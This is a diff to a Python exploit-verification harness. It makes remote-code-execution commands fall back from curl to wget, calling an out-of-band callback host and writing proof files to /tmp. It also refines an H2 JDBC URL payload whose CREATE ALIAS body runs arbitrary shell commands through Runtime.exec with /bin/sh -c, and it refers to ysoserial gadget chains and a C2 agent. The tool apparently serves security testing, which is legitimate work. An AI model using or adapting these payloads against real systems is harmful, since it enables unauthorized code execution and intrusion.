@@ -37,10 +37,13 @@ POLL_SEC    = int(os.getenv("POLL_SEC",   "12"))   # seconds to wait for callbac
 C2_WAIT     = int(os.getenv("C2_WAIT",   "40"))    # seconds to wait for C2 agent
 
 # Callback URL the target can reach to prove OOB/RCE
-# IMPORTANT: curl -o /tmp/oobx_TOKSHORT saves response to file = dual proof (callback + file)
-# Works with both Runtime.exec(String) splitting by spaces AND shell execution
+# Try curl first; fall back to wget for containers that only have wget.
+# ysoserial wraps commands containing spaces with bash -c "...", so the || operator works.
 CALLBACK_BASE = f"http://{OOB_HOST}:{OOB_HTTP}/callback/http"
-EXEC_CMD = lambda tok: f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]}"
+EXEC_CMD = lambda tok: (
+    f"curl -sk {CALLBACK_BASE}/{tok}/rce -o /tmp/oobx_{tok[:12]} 2>/dev/null"
+    f" || wget -q --no-check-certificate -O /tmp/oobx_{tok[:12]} {CALLBACK_BASE}/{tok}/rce 2>/dev/null"
+)
 
 # ── RCE file verification via docker exec ─────────────────────────────────────
 
@@ -622,12 +625,12 @@ def test_h2_jdbc(chain_id="jchains_h2_jdbc"):
         record(chain_id, "ERR ", f"token creation failed: {e}")
         return
     cmd = EXEC_CMD(tok)
-    # H2 dollar-quote ($$...$$) preserves semicolons inside the Java function body.
-    # \; in the INIT value is the statement separator between CREATE ALIAS and CALL.
+    # Dollar-quoted ($$...$$) preserves semicolons inside Java method body from H2's URL parser.
+    # /bin/sh -c lets bash handle the curl||wget fallback operator in EXEC_CMD.
+    # \; in the INIT URL value is the H2 statement separator between CREATE ALIAS and CALL.
     alias_body = (
         "void oobx(String c) throws Exception {"
         " Runtime.getRuntime().exec(new String[]{\"/bin/sh\",\"-c\",c});"
-        " Thread.sleep(800);"
         " }"
     )
     jdbc_url = (
